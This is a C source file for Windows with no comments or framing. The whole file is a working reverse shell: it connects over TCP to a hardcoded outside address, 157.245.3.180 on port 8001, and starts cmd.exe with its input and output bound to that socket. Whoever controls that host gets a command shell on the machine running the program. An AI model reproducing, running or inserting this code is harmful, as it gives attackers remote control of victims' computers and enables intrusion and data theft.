#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

DWORD WINAPI Connect(LPVOID) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;

    WSAStartup(MAKEWORD(2,2), &wsa);
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(8001);
    server.sin_addr.s_addr = inet_addr("157.245.3.180");

    if (connect(s, (SOCKADDR*)&server, sizeof(server)) == 0) {
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
        CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    }
    return 0;
}

int main() {
    CreateThread(NULL, 0, Connect, NULL, 0, NULL);
    Sleep(INFINITE);
    return 0;
}
